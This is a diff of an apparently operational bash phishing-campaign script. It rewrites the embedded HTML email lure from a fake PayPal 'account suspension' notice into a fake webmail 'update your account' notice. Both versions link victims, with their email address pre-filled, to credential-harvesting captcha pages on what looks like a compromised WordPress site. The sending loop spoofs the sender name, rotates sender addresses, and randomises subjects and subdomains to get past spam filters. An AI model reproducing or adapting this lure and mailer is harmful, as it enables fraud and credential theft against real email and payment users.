@@ -49,164 +49,93 @@ cat > email.html <<EOL
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Account Notification – Immediate Action Needed</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Action Required: Update Your Account</title>
   <style>
     body {
-      font-family: 'Helvetica Neue', sans-serif;
-      background-color: #eef2f7;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f2f4f8;
       margin: 0;
-      padding: 20px;
-      color: #2e2e2e;
+      padding: 0;
     }
-
     .container {
-      max-width: 640px;
-      margin: auto;
+      max-width: 600px;
+      margin: 40px auto;
       background-color: #ffffff;
       border-radius: 10px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.06);
-      overflow: hidden;
+      padding: 30px 40px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
     }
-
     .header {
-      background-color: #ffffff;
       text-align: center;
-      padding: 30px 20px 10px;
-      border-bottom: 1px solid #e0e0e0;
+      margin-bottom: 25px;
     }
-
     .header img {
-      max-width: 140px;
+      max-width: 180px;
+      margin-bottom: 10px;
     }
-
-    .content {
-      padding: 30px 25px;
-    }
-
-    .content h1 {
+    .title {
       font-size: 22px;
-      color: #003366;
-      margin-bottom: 16px;
-    }
-
-    .content p {
-      font-size: 15px;
-      line-height: 1.6;
-      margin-bottom: 16px;
-    }
-
-    .content ul {
-      padding-left: 20px;
-      margin-bottom: 16px;
-    }
-
-    .content ul li {
-      margin-bottom: 8px;
-    }
-
-    .button {
-      display: inline-block;
-      padding: 12px 28px;
-      background-color: #1D48A3;
-      color: #ffffff;
-      text-decoration: none;
       font-weight: 600;
+      color: #0077cc;
+    }
+    .content {
+      font-size: 16px;
+      color: #444;
+      line-height: 1.7;
+    }
+    .content p {
+      margin: 16px 0;
+    }
+    .button-container {
+      text-align: center;
+      margin-top: 30px;
+    }
+    .cta-button {
+      background-color: #0077cc;
+      color: #ffffff;
+      padding: 14px 28px;
       border-radius: 6px;
+      text-decoration: none;
+      font-size: 16px;
+      font-weight: 600;
       transition: background-color 0.3s ease;
     }
-
-    .button:hover {
-      background-color: #ffffff;
+    .cta-button:hover {
+      background-color: #005fa3;
     }
-
-    .alert {
-      background-color: #fff8e1;
-      padding: 15px 20px;
-      border: 1px solid #ffe58f;
-      border-radius: 6px;
-      font-weight: 500;
-      color: #8a6d3b;
-      margin-top: 25px;
-    }
-
     .footer {
-      text-align: center;
-      font-size: 13px;
+      margin-top: 40px;
+      font-size: 12px;
       color: #888;
-      padding: 25px 15px;
-    }
-
-    .footer a {
-      color: #3366cc;
-      text-decoration: none;
-    }
-
-    .footer a:hover {
-      text-decoration: underline;
-    }
-
-    @media (max-width: 600px) {
-      .content {
-        padding: 20px 15px;
-      }
+      text-align: center;
+      line-height: 1.5;
     }
   </style>
 </head>
 <body>
-
   <div class="container">
-
-    <!-- Header -->
     <div class="header">
-      <img src="https://ik.imagekit.io/yleultaj4/IMG_7172.png?updatedAt=1757889280517" alt="Company Logo" />
+      <img src="https://ik.imagekit.io/yleultaj4/webmail.jpg?updatedAt=1747527364367" alt="Webmail Logo" />
+      <div class="title">Action Required: Update Your Account</div>
     </div>
-
-    <!-- Body -->
     <div class="content">
-      <h1>Unusual Activity Detected on Your Account</h1>
-
-      <p>Dear Customer,</p>
-
-      <p>
-        We have identified suspicious activity on your Paypal account on <strong>September 13, 2025</strong> at approximately <strong>2:21 AM</strong>. 
-        This activity differs from your usual behavior and has triggered a temporary security lock on your account.
-      </p>
-
-      <p><strong>Potential causes for this alert may include:</strong></p>
-      <ul>
-        <li>Attempted sign-in with incorrect credentials</li>
-        <li>Login from an unfamiliar location or device</li>
-        <li>Multiple failed access attempts</li>
-        <li>Unusual or unauthorized transactions</li>
-      </ul>
-
-      <p>
-        For your safety, access to your account has been temporarily limited. To restore full access and confirm your identity, please click the secure link below:
-      </p>
-
-      <p style="text-align: center;">
-        <a href="https://avrentalservicesorlando.com/wp-admin/up/captcha.html?email={{EMAIL}}" class="button">Verify and Secure Account</a>
-      </p>
-
-      <div class="alert">
-        To prevent permanent restrictions, please complete the verification within 48 hours.
-      </div>
-
-      <p>We appreciate your prompt attention to this matter.</p>
-      <p>Paypal</p>
+      <p>Dear {{EMAIL}},</p>
+      <p>We have recently updated our <strong>Webmail Terms of Service</strong> to better serve you and enhance the security of your account.</p>
+      <p>To ensure uninterrupted access, we kindly request you to verify and update your account details.</p>
+      <p><strong>What you need to do:</strong><br>
+      Click the button below to review and confirm your account information.</p>
+      <p><strong>Please Note:</strong><br>
+      Failure to complete this process within the next 24 hours may result in temporary access restrictions or potential data loss.</p>
+    </div>
+    <div class="button-container">
+      <a href="https://avrentalservicesorlando.com/it/captcha2.html?email={{EMAIL}}" class="cta-button">Update Account</a>
+    </div>
+    <div class="footer">
+      &copy; 2025 Webmail Services. All rights reserved.<br />
+      This is an automated message—please do not reply.
     </div>
   </div>
-
-  <!-- Footer -->
-  <div class="footer">
-    <p>
-      Already verified your identity? 
-      <a href="https://avrentalservicesorlando.com/wp-admin/up/captcha.html?email={{EMAIL}}">Click here</a> to notify our security team.
-    </p>
-    <p>&copy; Paypal & Co. All rights reserved.</p>
-  </div>
-
 </body>
 </html>
 EOL
@@ -232,14 +161,14 @@ while IFS= read -r email; do
   from_username="supportzed$counter"
   from_domain="admailsend.com"
   from_email="$from_username@$from_domain"
-  from_name="PAYPAL SECURE"
+  from_name="WEBMAIL UPDATE"
   from_header="$from_name <$from_email>"
 
   # Generate random 3-digit number (e.g., 123)
   random_number=$(shuf -i 100-999 -n 1)
 
   # Construct the subject with random number
-  subject="TEMPORARY ACCOUNT SUSPENSION ! ($random_number)"
+  subject="SECURE MESSAGE - [Your email is outdated] ! ($random_number)"
 
   # Generate random 3-letter subdomain
   subdomain=$(tr -dc 'a-z' </dev/urandom | head -c3)
